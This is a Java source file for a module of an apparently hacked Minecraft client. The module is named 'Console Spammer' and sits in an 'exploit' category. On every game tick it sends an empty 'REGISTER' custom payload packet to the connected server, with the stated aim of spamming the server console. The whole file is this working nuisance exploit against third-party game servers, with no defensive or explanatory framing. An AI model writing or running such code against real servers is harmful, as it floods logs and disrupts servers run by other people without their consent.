package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.event.impl.TickListener;
import me.nekosarekawaii.foxglove.feature.FeatureCategory;
import me.nekosarekawaii.foxglove.feature.impl.module.Module;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleInfo;
import me.nekosarekawaii.foxglove.util.minecraft.via.ViaPackets;
import me.nekosarekawaii.foxglove.util.string.EnumNameNormalizer;
import me.nekosarekawaii.foxglove.value.Value;
import me.nekosarekawaii.foxglove.value.values.ListValue;
import net.fabricmc.fabric.api.networking.v1.PacketByteBufs;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.util.Identifier;

@ModuleInfo(name = "Console Spammer", description = "Tries to spamm's server consoles with text.", category = FeatureCategory.EXPLOIT)
public class ConsoleSpammerModule extends Module implements TickListener {

    private final Value<String> mode = new ListValue("Mode", "The current spamm mode.", this, Mode.RAW_PACKET.normalName());

    @Override
    protected void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    protected void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    @Override
    public void onTick() {
        final ClientWorld world = mc.world;
        final ClientPlayerEntity player = mc.player;
        final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
        final ClientPlayerInteractionManager interactionManager = mc.interactionManager;
        if (world == null || player == null || networkHandler == null || interactionManager == null) {
            this.setState(false);
            return;
        }
        if (this.mode.getValue().equals(Mode.RAW_PACKET.normalName())) {
            ViaPackets.sendCustomPayload(new Identifier("REGISTER"), PacketByteBufs.create());
        }
    }

    private enum Mode implements EnumNameNormalizer {

        RAW_PACKET;

        private final String normalName;

        Mode() {
            this.normalName = this.normalizeName(this.name());
        }

        @Override
        public String normalName() {
            return this.normalName;
        }

    }

}
